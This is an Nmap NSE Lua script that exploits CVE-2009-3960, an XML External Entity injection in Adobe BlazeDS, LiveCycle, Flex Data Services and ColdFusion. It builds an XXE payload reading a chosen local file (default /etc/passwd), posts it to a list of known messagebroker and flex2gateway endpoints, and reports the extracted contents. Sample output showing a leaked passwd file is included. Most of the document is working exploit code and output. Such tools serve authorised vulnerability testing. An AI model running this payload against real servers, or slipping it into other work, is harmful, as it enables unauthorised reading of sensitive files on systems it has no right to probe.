local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"

description = [[
Exploits cve-2009-3960 also known as Adobe XML External Entity Injection.

This vulnerability permits to read local files remotely and is present in
BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data 
Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and 
ColdFusion 7.0.2, 8.0, 8.0.1, and 9.0

For more information see:
* http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf
* http://www.osvdb.org/62292
* Metasploit module: auxiliary/scanner/http/adobe_xml_inject
]]

---
-- @args http-vuln-cve2009-3960.root Points to the root path. Defaults to "/"
-- @args http-vuln-cve2009-3960.readfile target file to be read. Defaults to "/etc/passwd"
--
-- @usage
-- nmap --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root="/root/" <target>
--
--@output
-- PORT   STATE SERVICE
-- 80/tcp open  http
--| http-vuln-cve2009-3960: 
--|     samples/messagebroker/http
--|     <?xml version="1.0" encoding="utf-8"?>
--|     <amfx ver="3"><body targetURI="/onResult" responseURI=""><object type="flex.messaging.messages.AcknowledgeMessage"><traits><string>timestamp</string><string>headers</string><string>body</string><string>correlationId</string><string>messageId</string><string>timeToLive</string><string>clientId</string><string>destination</string></traits><double>1.325337665684E12</double><object><traits><string>DSMessagingVersion</string><string>DSId</string></traits><double>1.0</double><string>5E037B49-540B-EDCF-A83A-BE9059CF6812</string></object><null/><string>root:x:0:0:root:/root:/bin/bash
--|     bin:*:1:1:bin:/bin:/sbin/nologin
--|     daemon:*:2:2:daemon:/sbin:/sbin/nologin
--|     adm:*:3:4:adm:/var/adm:/sbin/nologin
--|     lp:*:4:7:lp:/var/spool/lpd:/sbin/nologin
--|     sync:*:5:0:sync:/sbin:/bin/sync
--|     shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
--|     halt:*:7:0:halt:/sbin:/sbin/halt
--|     mail:*:8:12:mail:/var/spool/mail:/sbin/nologin
--|     news:*:9:13:news:/etc/news:
--|     uucp:*:10:14:uucp:/var/spool/uucp:/sbin/nologin
--|     operator:*:11:0:operator:/root:/sbin/nologin
--|     games:*:12:100:games:/usr/games:/sbin/nologin
--|     gopher:*:13:30:gopher:/var/gopher:/sbin/nologin
--|     ftp:*:14:50:FTP User:/var/ftp:/sbin/nologin
--|     nobody:*:99:99:Nobody:/:/sbin/nologin
--|     nscd:!!:28:28:NSCD Daemon:/:/sbin/nologin
--|     vcsa:!!:69:69:virtual console memory owner:/dev:/sbin/nologin
--|     pcap:!!:77:77::/var/arpwatch:/sbin/nologin
--|     mailnull:!!:47:47::/var/spool/mqueue:/sbin/nologin
--|     ...
--|_

author = "Hani Benhabiles"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive"}


portrule = shortport.http

action = function(host, port)
  -- Matching returned response body to confirm vulnerability
  local matchstart = '<?xml version="1.0" encoding="utf-8"?>'
  local matchend = '</string><null/></object></body></amfx>'
  local matchsize = 120
  local matchnotvuln = '<string>External entities are not allowed</string>'
  
  local results = {}
  local root = stdnse.get_script_args(SCRIPT_NAME .. ".root") or "/"
  local readfile = stdnse.get_script_args(SCRIPT_NAME .. ".readfile") or "/etc/passwd"

  local paths = {
    "messagebroker/http",
    "messagebroker/httpsecure",

    -- Coldfusion  
    "flex2gateway/http",  
    "flex2gateway/httpsecure",
                 
    -- BlazeDS
    "blazeds/messagebroker/http", 
    "blazeds/messagebroker/httpsecure",
    "samples/messagebroker/http",
    "samples/messagebroker/httpsecure",
                  
    -- LiveCycle Data Services
    "lcds/messagebroker/http", 
    "lcds/messagebroker/httpsecure", 
    "lcds-samples/messagebroker/http", 
    "lcds-samples/messagebroker/httpsecure", 
  }

  local exploit = [[<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test 
    [ <!ENTITY x3 SYSTEM "]].. readfile
    .. [["> ]><amfx ver="3" 
    xmlns="http://www.macromedia.com/2005/amfx"><body>
    <object type="flex.messaging.messages.CommandMessage">
    <traits><string>body</string><string>clientId</string>
    <string>correlationId</string><string>destination</string>
    <string>headers</string><string>messageId</string><string>
    operation</string><string>timestamp</string><string>timeToLive
    </string></traits><object><traits /></object><null /><string />
    <string /><object><traits><string>DSId</string><string>
    DSMessagingVersion</string></traits><string>nil</string>
    <int>1</int></object><string>&x3;</string><int>5</int>
    <int>0</int><int>0</int></object></body></amfx>]]


  local options = {header={["Content-Type"]="application/x-amf"}}
  local path

  local http_vuln = {
    title = "Adobe XML External Entity Injection",
    IDS = {CVE = 'CVE-2009-3960'},
    risk_factor = "High",
    scores = {
      CVSSv2 = "4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:P/I:N/A:N)",
    },
    description = [[
Permits to read local files remotely and is present in
BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data 
Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and 
ColdFusion 7.0.2, 8.0, 8.0.1, and 9.0]],
    references = {
      'http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf',
      'http://www.osvdb.org/62292'
    },
    dates = {
      disclosure = {year = '2010', month = '02', day = '15'},
    },
    exploit_results = {},
  }
  
  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  http_vuln.state = vulns.STATE.NOT_VULN

  for _,path in pairs(paths) do
    local uri = root .. path
    local response = http.post(host, port, uri, options, nil, exploit)
  
    if response.status == 200 then   
      if #response.body >= matchsize and 
        string.sub(response.body,1,string.len(matchstart))==matchstart and
        string.sub(response.body,-string.len(matchend))==matchend and
        string.match(response.body, matchnotvuln)==nil
        then
          table.insert(results, {'File: ' .. readfile .. ' extracted via ' .. path .. '\n\n',{response.body}})
          http_vuln.extra_info = stdnse.format_output(true, results)
          http_vuln.state = vulns.STATE.EXPLOIT
        end
    end
  end

  return report:make_output(http_vuln)
end
